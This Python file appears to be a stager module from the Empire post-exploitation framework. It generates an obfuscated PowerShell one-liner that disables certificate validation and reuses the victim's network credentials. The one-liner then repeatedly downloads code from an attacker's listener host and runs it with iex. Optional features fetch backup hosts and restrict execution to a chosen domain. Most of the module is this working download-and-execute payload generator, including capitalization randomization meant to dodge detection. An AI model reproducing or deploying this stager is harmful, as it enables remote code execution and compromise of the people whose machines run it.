from __future__ import print_function
from builtins import object
from lib.common import helpers

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Downloader',

            'Author': ['@tyraniter'],

            'Description': ('Generates a one-liner stage-1 downloader for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'BackupHostsSource' : {
                'Description'   :   'Url where to get backupHosts to use when up to StagerRetries.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output launcher to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'DomainCheck' : {
                'Description'   :   'Check whether in domain else not execute',
                'Required'      :   False,
                'Value'         :   ''
            },
            'BackupHostsSource' : {
                'Description'   :   'Url where to get backupHosts to use when up to StagerRetries.',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        backupHostsSource = self.options['BackupHostsSource']['Value']
        domainCheck = self.options['DomainCheck']['Value']
        
        listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]
                
        if backupHostsSource != "":
            backupHostsSourceCode='''
            $ser=$a.DownloadString('%s').trim();
            ''' % backupHostsSource
        else:
            backupHostsSourceCode=''
        
        if domainCheck != "":
            domainCheckCode='''
            $env:userdomain -eq  '%s'
            ''' % domainCheck
        else:
            domainCheckCode='1'

        code='''
        $ser='%s';
        [net.servicepointmanager]::ServerCertificateValidationCallback={$true};
        $a=New-Object Net.WebClient;
        $a.Credentials=$a.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
        while(%s){
            try{
                $a.DownloadString($ser+'/download/po')|iex;
                break;}
            catch{
                write-verbose $_.Exception.Message -Verbose;
                %s
            }
        };
        ''' % (listenerOptions['options']['Host']['Value'],domainCheckCode,backupHostsSourceCode)
        # generate the downloader code
        downloader=''
        for line in code.split("\n"):
            line = line.strip()
            # skip commented line
            if not line.startswith("#"):
            # randomize capitalization of lines without quoted strings
                if "'" not in line:
                    downloader += helpers.randomize_capitalization(line)
                else:
                    downloader += line
        return downloader
